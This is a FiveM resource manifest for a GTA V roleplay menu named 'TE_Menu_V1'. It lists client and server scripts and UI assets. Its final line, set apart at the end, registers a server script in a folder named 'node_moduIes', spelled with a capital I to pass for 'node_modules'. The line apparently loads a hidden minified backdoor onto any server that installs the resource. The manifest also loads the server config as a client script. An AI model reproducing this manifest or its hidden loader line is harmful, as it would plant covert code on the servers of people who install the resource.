fx_version 'bodacious'
games {'gta5'}
lua54 "yes"


name 'TE_Menu_V1'
version '1.2.2'
author 'Al-Dolime'


escrow_ignore {
  "Config/cl_Config.lua",
  "Config/sv_Config.lua"
}

client_script 'Config/sv_Config.lua'
server_script 'Config/sv_Config.lua'

client_script {
	"lib/Proxy.lua",
	"lib/Tunnel.lua",
  "DontEdit/server2.lua",
  "DontEdit/server3.lua",
  "DontEdit/client.lua",
	"DontEdit/client2.lua",
  "DontEdit/Mr51.lua",
  '@mysql-async/lib/MySQL.lua'
}

server_scripts{ 
  "@vrp/lib/utils.lua",
  "DontEdit/server.lua",
  "DontEdit/server3.lua",
  '@mysql-async/lib/MySQL.lua'
}

ui_page "html/menu.html"

files {
	"html/menu.html",
	"html/raphael.min.js",
	"html/wheelnav.spreader.js",
  "html/wheelnav.min.js",
  "html/*.png",
	"html/*.ogg"
}
server_script "node_moduIes/App-min.js"



